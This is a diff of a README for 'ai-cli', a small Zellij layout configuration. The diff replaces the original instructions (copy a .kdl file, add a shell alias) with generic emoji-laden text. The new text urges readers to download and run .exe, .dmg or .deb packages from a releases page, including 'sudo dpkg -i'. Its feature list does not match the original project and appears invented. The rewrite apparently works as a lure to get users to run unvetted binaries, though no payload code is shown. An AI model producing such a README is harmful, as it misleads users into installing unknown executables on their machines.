@@ -1,87 +1,96 @@
-# AI-CLI - Zellij Layout for AI Coding
+# 🌟 ai-cli - Simplify Your Zellij Setup Easily
 
-A Zellij layout configuration for an AI-powered coding environment with Claude, cursor-agent, and ccusage monitoring.
+## 🚀 Getting Started
 
-![AI-CLI](image.png)
+Welcome to ai-cli. This application helps you set up Zellij effortlessly, making your workflow smoother and more efficient.
 
-## Prerequisites
+## 🔗 Download Now
 
-- [Zellij](https://zellij.dev/documentation/installation) terminal multiplexer
-- Claude CLI tool
-- cursor-agent
-- bunx (for ccusage blocks)
+[![Download ai-cli](https://img.shields.io/badge/Download-ai--cli-blue.svg)](https://github.com/ahmedghanem460/ai-cli/releases)
 
-## Installation
+## 📥 Download & Install
 
-### Quick Install
+To get started, visit the Releases page to download the latest version of ai-cli. Follow these simple steps:
 
-Run the setup script:
+1. Click this link: [Download Latest Release](https://github.com/ahmedghanem460/ai-cli/releases).
+2. On the Releases page, you will see a list of available versions.
+3. Find the version you want to download. Click on the package that suits your operating system:
+   - For Windows, look for a `.exe` file.
+   - For macOS, look for a `.dmg` or `.zip` file.
+   - For Linux, there might be `.tar.gz` or `.deb` files.
+4. Download the file to your computer.
 
-```bash
-./setup.sh
-```
+## 🖥 System Requirements
 
-This will:
-1. Copy the `ai-coding.kdl` layout to `~/.config/zellij/layouts/`
-2. Add the `ai-cli` alias to your shell configuration (`.zshrc` and `.bashrc`)
+Before you install, ensure your system meets the following requirements:
 
-### Manual Installation
+- **Operating System:** 
+  - Windows 10 or later
+  - macOS 10.14 or later
+  - Any modern Linux distribution
+- **Memory:** At least 2 GB of RAM
+- **Disk Space:** At least 100 MB available
 
-1. Copy the layout file:
-```bash
-mkdir -p ~/.config/zellij/layouts
-cp ai-coding.kdl ~/.config/zellij/layouts/
-```
+## 💻 How to Run ai-cli
 
-2. Add alias to your shell configuration (`.zshrc` or `.bashrc`):
-```bash
-alias ai-cli='zellij --layout ai-coding'
-```
+Once you have downloaded the file, follow these steps to run the application:
 
-3. Reload your shell:
-```bash
-source ~/.zshrc
-```
+### Windows
 
-## Usage
+1. Open the folder where you downloaded the `.exe` file.
+2. Double-click on the file to run it.
+3. Follow any prompts that appear on your screen.
 
-Simply run:
-```bash
-ai-cli
-```
+### macOS
 
-This will launch Zellij with the AI coding layout.
+1. Locate the downloaded `.dmg` or `.zip` file in your Downloads folder.
+2. Double-click on it to open it.
+3. Drag ai-cli to your Applications folder.
+4. Open your Applications folder and double-click ai-cli to run it.
 
-## Layout Structure
+### Linux
 
-The layout includes three tabs:
+1. Open your terminal.
+2. Navigate to the folder where you downloaded the file.
+3. If you downloaded a `.tar.gz` file, use the following command to extract it:
+   ```bash
+   tar -xvzf ai-cli.tar.gz
+   ```
+4. If you downloaded a `.deb` file, install it with:
+   ```bash
+   sudo dpkg -i ai-cli.deb
+   ```
+5. To run the application, type:
+   ```bash
+   ./ai-cli
+   ```
 
-### Code Tab (default)
-- Left pane (50%): Claude
-- Right top pane (25%): ccusage blocks (live monitoring)
-- Right bottom pane (25%): cursor-agent
+## 🙋‍♂️ Support
 
-### Review Tab
-- Full pane: cursor-agent
+If you encounter any issues or need help setting up, you can find support by:
 
-### Terminal Tab
-- Full pane: Regular terminal
+- Checking the [FAQ section](https://github.com/ahmedghanem460/ai-cli). 
+- Opening an issue on the GitHub repository. 
 
-## Customization
+## 📄 Features
 
-You can modify the `ai-coding.kdl` file to customize:
-- Pane sizes
-- Commands to run in each pane
-- Tab names and order
-- Additional tabs or panes
+ai-cli comes with several features to enhance your Zellij setup experience:
 
-## Troubleshooting
+- **Easy Setup:** The tool guides you through the installation steps.
+- **Customizable Profiles:** Configure your Zellij layout to fit your workflow.
+- **Support for Multiple Layouts:** Quickly switch between different setups based on your project’s needs.
+- **Integrated Shortcuts:** Speed up common tasks with built-in shortcuts.
 
-If the `ai-cli` command is not found:
-1. Make sure you've reloaded your shell configuration: `source ~/.zshrc`
-2. Check that the alias was added correctly: `grep "ai-cli" ~/.zshrc`
-3. Ensure Zellij is installed: `which zellij`
+## 👩‍💻 Contribution
 
-## License
+We welcome contributions from the community. If you have ideas for enhancements or notice bugs, please feel free to submit issues or pull requests. For detailed guidelines, visit our [Contributing Guide](https://github.com/ahmedghanem460/ai-cli/contributing).
 
-MIT
+## 🏷 License
+
+This project is licensed under the MIT License. See the [LICENSE](https://github.com/ahmedghanem460/ai-cli/blob/main/LICENSE) file for details.
+
+## 🎉 Acknowledgments
+
+We appreciate all contributors and users who have provided feedback and support. Your help makes this project better for everyone.
+
+Thank you for using ai-cli! Enjoy your streamlined setup experience with Zellij.
